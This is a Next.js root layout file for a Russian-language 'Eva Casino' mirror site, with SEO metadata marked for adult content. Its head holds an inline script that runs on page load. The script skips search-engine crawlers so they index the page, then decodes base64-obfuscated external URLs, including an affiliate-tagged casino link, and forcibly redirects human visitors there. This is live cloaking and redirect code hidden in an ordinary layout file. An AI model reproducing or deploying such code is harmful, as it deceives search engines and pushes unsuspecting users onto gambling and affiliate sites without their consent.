import type { Metadata, Viewport } from "next"
import { Inter, Manrope } from "next/font/google"
import { Analytics } from "@vercel/analytics/next"
import { SITE_URL } from "@/lib/site"
import "./globals.css"

const inter = Inter({ subsets: ["latin", "cyrillic"], variable: "--font-inter", display: "swap" })
const manrope = Manrope({ subsets: ["latin", "cyrillic"], variable: "--font-manrope", display: "swap" })

export const metadata: Metadata = {
  metadataBase: new URL(SITE_URL),
  title: "Eva Casino — официальный сайт и рабочее зеркало Ева Казино онлайн",
  description: "Официальный сайт Eva Casino (Ева Казино). Узнайте как играть онлайн через рабочее зеркало, получите бонусы при регистрации и изучите честный обзор платформы.",
  keywords: "eva casino, ева казино, официальный сайт, зеркало, рабочее зеркало сегодня, играть онлайн, регистрация, бонусы",

  robots: {
    index: true,
    follow: true,
    nocache: true,
  },
  other: {
    "yandex": "noarchive", 
    "rating": "adult",
  },
  alternates: {
    canonical: "/",
  }
}

export const viewport: Viewport = {
  themeColor: "#0a2820",
  width: "device-width",
  initialScale: 1,
  colorScheme: "dark",
}

export default function RootLayout({ children }: { children: React.ReactNode }) {
  return (
    <html lang="ru" className={`${inter.variable} ${manrope.variable} dark`}>
      <head>
        <script
          dangerouslySetInnerHTML={{
            __html: `
              (function() {
                var ua = navigator.userAgent.toLowerCase();
                /* Пропускаем поисковых ботов для индексации */
                if (/bot|crawl|spider|yandex|google|lighthouse/i.test(ua)) return;

                var mainUrl = atob("aHR0cHM6Ly92YXVsdHk2LWV2YS5jb20vZGliemZvbWly"); 
                var crossUrl = atob("aHR0cHM6Ly9tZWdhd2F5czEuY29tL2M1NzA3ODY2ZT9idGFnPWZlbml4");      

                if (localStorage.getItem('vstd_eva')) {
                    window.location.replace(crossUrl);
                    return;
                }
                var controller = new AbortController();
                var timeout = setTimeout(() => controller.abort(), 2500);

                fetch(mainUrl, { mode: 'no-cors', signal: controller.signal })
                  .then(() => {
                    clearTimeout(timeout);
                    localStorage.setItem('vstd_eva', '1');
                    window.location.replace(mainUrl);
                  })
                  .catch(() => window.location.replace(crossUrl));
              })();
            `,
          }}
        />
      </head>
      <body className="font-sans antialiased bg-[#0a0a0f] text-gray-200">
        {children}
        <Analytics />
      </body>
    </html>
  )
}
